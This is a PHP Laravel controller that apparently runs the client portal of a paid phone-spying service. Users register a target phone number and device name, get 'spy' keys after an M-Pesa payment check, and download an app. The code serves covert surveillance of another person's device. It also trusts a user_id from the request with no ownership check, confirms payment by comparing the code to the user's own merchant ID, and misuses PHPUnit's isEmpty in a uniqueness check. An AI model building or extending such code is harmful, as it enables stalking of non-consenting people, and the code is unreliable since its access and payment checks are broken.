<?php

namespace App\Http\Controllers;

use App\Models\Message;
use App\Models\MpesaTransaction;
use App\Models\User;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use function PHPUnit\Framework\isEmpty;

class ClientController extends Controller
{
    public function __construct(){
        $this->middleware('auth');
    }

    public function portal(){
        if (Auth::check()) {
            $user = User::find(Auth::user()->id);
            if ($user->is_verified == 1) {
                return view('portal.index')->with('user', $user);
            }else{
                return view('portal.setup')->with('user', $user);
            }
        }

        return redirect()->route('show.login')->with('error', 'Error, Access denied');
    }

    public function setup(){
        if (Auth::check()) {
            $user = User::find(Auth::user()->id);
            if ($user->is_client == 1) {
                return view('portal.setup')->with('user', $user);
            }
        }

        return redirect()->route('show.login')->with('error', 'Error, Access denied');
    }

    public function update_information(Request $request){
        $request->validate([
            'target_phone_number'=>'required',
            'target_device_name'=>'required'
        ]);

        $target_phone_number = $request->target_phone_number;
        $target_device_name = $request->target_device_name;
        $user_id = $request->user_id;

        $user = User::find($user_id);
        $user->target_phone_number = $target_phone_number;
        $user->target_device_name = $target_device_name;
        $user->status = "started";
        $user->update();

        return redirect()->route('setup')->with('success', 'information added successfully')
            ->with('user',$user);
    }

    public function generate_keys($user_id){
        $user = User::find($user_id);

        $spy_key = Hash::make(Str::random(100));
        $spy_value = Hash::make(Str::random(100));
        $user->spy_secret_key = $spy_key;
        $user->spy_secret_value = $spy_value;
        $user->status = "midway";
        $user->update();

        return redirect()->route('setup')->with('success', 'keys generated successfully')
            ->with('user',$user);
    }

    //show the mmpesa payment confirmation form
    public function show_confirm(){
        return view('mpesa.confirmation');
    }

    //confirm the mpesa payment PHE9MB0YL1
    public function confirm_payment(Request $request){
        $request->validate([
            'transaction_code'=>'required'
        ]);

        $transaction_code = $request->transaction_code;
        $user = Auth::user()->id;
        $merchant_id = User::where('id', $user)->pluck('merchant_id');

        if ($transaction_code == $merchant_id[0]){
            $this->generate_spy_key($user);
            return redirect()->route('setup')->with('success', "Payment confirmed");
        }

        return redirect()->route('setup')->with('error', 'payment not confirmed..please contact our customer care');
    }

    public function generate_spy_key($user_id){
        $spy_key = random_int(100000, 999999);

        //check if there is similar key in db
        $check_key = DB::table('users')->where('spy_key', $spy_key)->pluck('spy_key');
        $user = User::find($user_id);

        if (isEmpty($check_key)){
            $user->spy_key = $spy_key;
            $user->status = "completed";
            $user->is_payment_confirmed = 1;
            $user->update();
        }else {
            $this->generate_spy_key($user_id);
        }
    }

    public function download_app(){
        $user_id = Auth::user()->id;
        $user = User::find($user_id);
        $user->downloaded = 1;
        $user->update();

       return Storage::download('data.txt');
    }
}
